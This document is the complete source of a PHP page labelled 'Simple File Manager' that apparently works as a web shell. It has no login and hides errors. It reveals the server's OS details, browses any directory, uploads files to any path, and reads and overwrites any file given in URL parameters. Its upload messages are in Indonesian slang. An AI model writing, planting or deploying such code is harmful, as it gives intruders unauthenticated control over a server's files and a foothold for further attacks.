<!DOCTYPE html>
<html>
<head>
	<title>Simple File Manager</title>
</head>
<body>
	
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">

	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.6.3/css/all.min.css"  />

	<script type="text/javascript">

		function addUrlParameter(nama, value){
			var newURL = location.href.split("?search")[0];
			window.history.pushState('object',document.title,newURL);

			var searchParams = new URLSearchParams(window.location.search)
			searchParams.set(nama,value)
			
			window.location.search = searchParams.toString()

		}
	</script>



	<?php

	error_reporting(0);

	echo 'User Agent: '.$_SERVER['HTTP_USER_AGENT'];
	echo "<br>";
	
	
	function path() {
		if(isset($_GET['dir'])) {
			$dir = str_replace("\\", "/", $_GET['dir']);
			@chdir($dir);
		} else {
			$dir = str_replace("\\", "/", getcwd());
		}
		return $dir;
	}
	function windisk() {
		$letters = "";
		$v = explode("\\", path());
		$v = $v[0];
		foreach(range("A", "Z") as $letter) {
			$bool = $isdiskette = in_array($letter, array("A"));
			if(!$bool) $bool = is_dir("$letter:\\");
			if($bool) {
				$letters .= "[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
				if($letter.":" != $v) {
					$letters .= $letter;
				}
				else {
					$letters .= color(1, 2, $letter);
				}
				$letters .= "</a> ]";
			}
		}
		if(!empty($letters)) {
			print "Drives : $letters<br>";
		}
		if(count($quicklaunch) > 0) {
			foreach($quicklaunch as $item) {
				$v = realpath(path(). "..");
				if(empty($v)) {
					$a = explode(DIRECTORY_SEPARATOR,path());
					unset($a[count($a)-2]);
					$v = join(DIRECTORY_SEPARATOR, $a);
				}
				print "<a href='".$item[1]."'>".$item[0]."</a>";
			}
		}
	}
	function OS() {
		return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
	}
	echo "<br>";
	echo "OS : ".OS();
	echo ' <b>('.php_uname().')</b>';
	echo "<br>";
	echo '<br/><div style="float: right;margin-right:20%;">';
	echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
	echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
	if( $_POST['_upl'] == "Upload" ) {
		if(@copy($_FILES['file']['tmp_name'], $_GET['dir'].$_FILES['file']['name'])) { echo '<b>Upload Sukses Ngab !!!</b><br><br>'; }
		else { echo '<b>JANCOO** !!! Upload GAGAL !!!</b><br><br>'; }
	}
	echo "</div>";
	echo "<br>";
	echo windisk();
	echo "<br>";


	// echo path();
	$path = explode("/",path());

	echo '<a href="openfile.php"><li class="fa fa-home"></li></a> ';
	foreach ($path as $key => $value) {
		if ($key>0) {
			$temp_dir .= $path[$key-1].'/';
			$direktori = $temp_dir.$value;
		}else{
			$temp_dir .= $path[$key-1];
			$direktori = $value.'/';
		}

		
		echo '<a href="?dir='.$direktori.'/">'.$value.'</a>/';
	}
	

	$dir = path();	

	echo '<ul class="list-group list-group-flush">';

	$variable = (scandir($dir));
	foreach ($variable as $key => $value) {

		if (is_dir($value)) {
			echo '<li class="list-group-item" ><a href="?dir=' .path().'/'.$value."/".'"><i class="fas fa-folder-close"></i>'.$value.'</a>';
		}
	}

	foreach ($variable as $key => $value) {
		if (!is_dir($value)) {
			echo '<li class="list-group-item" ><a onclick="addUrlParameter('."'f','" .$value."'".')"><i class="fas fa-file-alt"></i>'.$value.'</a>';
		}
	}

	echo "</ul>";

	

	

	if (isset($_GET['f'])) {

		if (isset($_POST['code'])) {
			$file = fopen($_GET['f'],"w");
			fwrite($file,$_POST['code']);
			fclose($file);
		}

		echo '<div class="card card-body"><form method="POST">';

		$myfile = fopen($_GET['dir'].$_GET['f'], "r") or die("Unable to open file!");
		echo '<textarea name="code" class="form-control" rows="20">'.htmlspecialchars(fread($myfile,filesize($_GET['dir'].$_GET['f']))).'</textarea>';
		fclose($myfile);
		
		echo '<input type="submit" class="btn btn-primary" name="" />
		</form></div>';
	}

	?>
	

</body>
</html>